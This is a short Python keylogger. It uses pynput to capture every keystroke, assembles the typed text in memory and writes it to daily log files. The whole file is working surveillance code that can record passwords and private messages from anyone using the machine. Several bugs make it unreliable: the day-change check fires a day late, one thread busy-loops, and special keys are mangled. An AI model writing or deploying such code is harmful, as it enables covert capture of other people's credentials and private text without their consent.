from threading import Thread
from pynput.keyboard import Key, Listener
from datetime import datetime, timedelta
from pathlib import Path

current_date = datetime.now()
previous_date = datetime.now()
word = ''
Full_day_list = ''



def create_new_text():
    # creates a logfile for the current date if it doesnt already exist
    global current_date
    while True:
        current_date = datetime.now()
        if not Path("./log{}.txt".format(current_date.date())).is_file():
            with open('log{}.txt'.format(current_date.date()), 'w') as file:
                file.close()

def writeloop():
    # This function will write to the log file every day at midnight
    global current_date
    global previous_date
    global word
    global Full_day_list
    while True:
        if current_date.date() > previous_date.date() + timedelta(days=1):
            Full_day_list = word
            word = ''
            with open('log{}.txt'.format(previous_date.date()), 'w') as file:
                file.write(Full_day_list)
                file.close()
            Full_day_list = None    # attempt at freeing up some memory
            previous_date = datetime.now()



def keypress(key):
    # logging keystrokes
    global word
    if key == Key.space:
        word += ' '
    elif key == Key.enter:
        word += '\n'
    elif key == Key.backspace:
        word = word[:-1]
    elif key == Key.shift_l or key == Key.shift_r:
        return
    else:
        char = str(key)
        char = char[1]
        word += char
        print(word)


X = Listener(on_press=keypress)

thread1 = Thread(target=create_new_text)
thread2 = Thread(target=writeloop)
thread2.isDaemon()
thread1.isDaemon()
thread1.start()
thread2.start()
X.start()

